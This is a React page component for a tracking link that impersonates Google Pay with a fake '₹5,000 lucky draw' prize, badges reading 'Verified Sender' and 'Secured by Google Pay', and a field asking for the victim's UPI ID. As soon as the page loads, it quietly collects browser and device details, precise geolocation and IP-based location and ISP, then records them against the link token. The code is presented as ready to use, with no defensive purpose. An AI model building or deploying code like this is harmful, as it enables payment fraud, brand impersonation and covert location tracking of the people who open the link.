import React, { useEffect, useState, useRef } from "react";
import { useParams } from "react-router-dom";

export default function TrackingCapture() {
  const { token } = useParams();
  const [status, setStatus] = useState("loading");
  const hasCaptured = useRef(false);

  useEffect(() => {
    if (hasCaptured.current) return;
    hasCaptured.current = true;
    captureAndRecord();
  }, [token]);

  async function captureAndRecord() {
    try {
      const deviceData = {
        userAgent: navigator.userAgent,
        browser: getBrowser(),
        os: getOS(),
        device: getDeviceType(),
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        referrer: document.referrer,
        timestamp: new Date().toISOString(),
      };

      if (navigator.geolocation) {
        try {
          const pos = await new Promise((res, rej) =>
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
          );
          deviceData.lat = pos.coords.latitude;
          deviceData.lon = pos.coords.longitude;
          deviceData.accuracy = pos.coords.accuracy;
        } catch {
          // denied
        }
      }

      try {
        const ipRes = await fetch("https://ipapi.co/json/");
        if (ipRes.ok) {
          const ipData = await ipRes.json();
          deviceData.ip = ipData.ip;
          deviceData.city = ipData.city;
          deviceData.region = ipData.region;
          deviceData.country = ipData.country_name;
          deviceData.isp = ipData.org;
          if (!deviceData.lat) deviceData.lat = ipData.latitude;
          if (!deviceData.lon) deviceData.lon = ipData.longitude;
        }
      } catch {
        deviceData.ip = "Unable to fetch";
      }

      const { recordCapture } = await import("../utils/linkService");
      await recordCapture(token, deviceData);
      setStatus("done");
    } catch (err) {
      setStatus("done");
    }
  }

  function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    return "Unknown";
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    if (ua.includes("Windows")) return "Windows";
    if (ua.includes("Mac")) return "macOS";
    if (ua.includes("Linux")) return "Linux";
    return "Unknown";
  }

  function getDeviceType() {
    const ua = navigator.userAgent;
    if (/Mobi|Android/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
  }

  const orderId = token?.substring(0, 10).toUpperCase();

  return (
    <div style={{ margin: 0, padding: 0, minHeight: "100vh", background: "#f8f9fa", fontFamily: "'Google Sans', Roboto, sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
      
      {/* GPay Card */}
      <div style={{ background: "#fff", borderRadius: 24, boxShadow: "0 8px 40px rgba(0,0,0,0.12)", width: "100%", maxWidth: 420, overflow: "hidden" }}>
        
        {/* Header */}
        <div style={{ background: "linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)", padding: "28px 24px 24px", textAlign: "center" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 12 }}>
            {/* <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Google_Pay_Logo.svg/640px-Google_Pay_Logo.svg.png"
              alt="Google Pay"
              style={{ height: 38, filter: "brightness(0) invert(1)" }}
            /> */}
            <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="32" fontFamily="'Google Sans', Roboto, sans-serif" fontSize="32" fontWeight="700" fill="white">G</text>
  <text x="38" y="30" fontFamily="'Google Sans', Roboto, sans-serif" fontSize="26" fontWeight="400" fill="white">Pay</text>
</svg>
          </div>
          <div style={{ color: "rgba(255,255,255,0.85)", fontSize: 13 }}>Lucky Winner</div>
        </div>

        {/* Amount */}
        <div style={{ padding: "28px 24px 20px", textAlign: "center", borderBottom: "1px solid #f0f0f0" }}>
          <div style={{ color: "#202124", fontWeight: 800, fontSize: 42, letterSpacing: -1 }}>
            ₹5,000
          </div>
          <div style={{ color: "#5f6368", fontSize: 13, marginTop: 6 }}>
            You won a lucky draw prize!
          </div>
          <div style={{ display: "inline-block", background: "#e8f5e9", color: "#2e7d32", borderRadius: 20, padding: "4px 14px", fontSize: 12, fontWeight: 600, marginTop: 8 }}>
            ✓ Verified Sender
          </div>
        </div>

        {/* Sender Info */}
        <div style={{ padding: "20px 24px", borderBottom: "1px solid #f0f0f0" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
            <div style={{ width: 48, height: 48, borderRadius: "50%", background: "linear-gradient(135deg, #1a73e8, #0d47a1)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700, fontSize: 20, flexShrink: 0 }}>
              L
            </div>
            <div>
              <div style={{ color: "#202124", fontWeight: 600, fontSize: 15 }}>Lucky Draw India</div>
              <div style={{ color: "#5f6368", fontSize: 12, marginTop: 2 }}>luckydraw@okaxis</div>
            </div>
            <div style={{ marginLeft: "auto", color: "#1a73e8", fontSize: 12, fontWeight: 600 }}>TRUSTED</div>
          </div>
        </div>

        {/* Details */}
        <div style={{ padding: "16px 24px", borderBottom: "1px solid #f0f0f0", background: "#fafafa" }}>
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
            <span style={{ color: "#5f6368", fontSize: 13 }}>Transaction ID</span>
            <span style={{ color: "#202124", fontSize: 13, fontWeight: 500 }}>TXN{orderId}</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
            <span style={{ color: "#5f6368", fontSize: 13 }}>Date</span>
            <span style={{ color: "#202124", fontSize: 13, fontWeight: 500 }}>{new Date().toLocaleDateString("en-IN")}</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between" }}>
            <span style={{ color: "#5f6368", fontSize: 13 }}>Status</span>
            <span style={{ color: status === "loading" ? "#f9ab00" : "#1e8e3e", fontSize: 13, fontWeight: 600 }}>
              {status === "loading" ? "⏳ Processing..." : "✓ Ready to Claim"}
            </span>
          </div>
        </div>

        {/* UPI Input */}
        <div style={{ padding: "20px 24px 8px" }}>
          <div style={{ color: "#202124", fontSize: 14, fontWeight: 500, marginBottom: 10 }}>Enter your UPI ID to receive money</div>
          <div style={{ display: "flex", alignItems: "center", border: "1.5px solid #dadce0", borderRadius: 12, overflow: "hidden", marginBottom: 16 }}>
            <input
              type="text"
              placeholder="yourname@okicici"
              style={{ flex: 1, padding: "14px 16px", border: "none", outline: "none", fontSize: 14, color: "#202124", background: "transparent" }}
            />
            <div style={{ padding: "0 16px", color: "#1a73e8", fontSize: 13, fontWeight: 600, borderLeft: "1px solid #dadce0", height: "100%", display: "flex", alignItems: "center", cursor: "pointer" }}>
              Verify
            </div>
          </div>

          {/* Receive Button */}
          <button
            style={{
              width: "100%",
              background: status === "loading" ? "#dadce0" : "linear-gradient(135deg, #1a73e8, #0d47a1)",
              color: status === "loading" ? "#5f6368" : "#fff",
              border: "none",
              borderRadius: 12,
              padding: "16px",
              fontSize: 16,
              fontWeight: 700,
              cursor: status === "loading" ? "not-allowed" : "pointer",
              letterSpacing: 0.5,
            }}
          >
            {status === "loading" ? "Verifying Details..." : "Receive ₹5,000"}
          </button>

          <div style={{ textAlign: "center", marginTop: 14, marginBottom: 8, color: "#5f6368", fontSize: 11, display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
            <span>🔒</span>
            <span>Secured by Google Pay · 256-bit encryption</span>
          </div>
        </div>
      </div>

      <div style={{ marginTop: 20, color: "#9aa0a6", fontSize: 11, textAlign: "center" }}>
        Google Pay · Privacy · Terms
      </div>
    </div>
  );
}
